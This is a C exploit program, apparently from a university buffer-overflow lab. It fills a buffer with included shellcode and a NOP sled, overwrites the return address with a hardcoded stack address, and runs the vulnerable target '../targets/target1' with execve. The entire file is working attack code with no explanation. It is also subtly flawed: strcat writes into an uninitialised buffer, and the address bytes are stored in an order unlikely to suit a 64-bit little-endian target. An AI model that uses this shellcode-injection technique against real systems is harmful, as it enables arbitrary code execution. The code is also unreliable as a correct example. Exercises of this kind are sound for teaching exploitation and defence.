#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

#define SHELL_SIZE 45
#define BUF_TO_RET 120
#define BUF_SIZE 126
#define BUF_ADDR 0x2021feb0

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char attack_buffer[BUF_SIZE];

	strcat(attack_buffer, shellcode);
	for (int i = SHELL_SIZE; i < BUF_TO_RET; i++)
		attack_buffer[i] = 0x90;

	// int * ret_address = (int*)&attack_buffer[BUF_TO_RET];
	// *ret_address = 0x2021feb0;
	// attack_buffer[BUF_SIZE - 1] = '\0';

	int target = 0x2021fe10;
	// char *ptr = (char*)0x2021feb0;

	// for(int i = 0; i < 6; i++){
	// 	*(attack_buffer+120+i) = ptr[i];
	// }
	attack_buffer[BUF_TO_RET + 3] = (char) (target & 0x000000ff);
	attack_buffer[BUF_TO_RET + 2] = (char) ((target >> 8) & 0x0000ff);
	attack_buffer[BUF_TO_RET + 1] = (char) ((target >> 16) & 0x00ff);
	attack_buffer[BUF_TO_RET] = (char) (target >> 24);

	//memcpy(&attack_buffer[BUF_TO_RET], (char *)0x2021fe10, sizeof(char *));

	printf("attack_buffer %s\n",attack_buffer);
	printf("%x%x%x%x\n",attack_buffer[BUF_TO_RET],
						attack_buffer[BUF_TO_RET + 1],
						attack_buffer[BUF_TO_RET + 2],
						attack_buffer[BUF_TO_RET + 3]);

	args[0] = TARGET;
	args[1] = attack_buffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
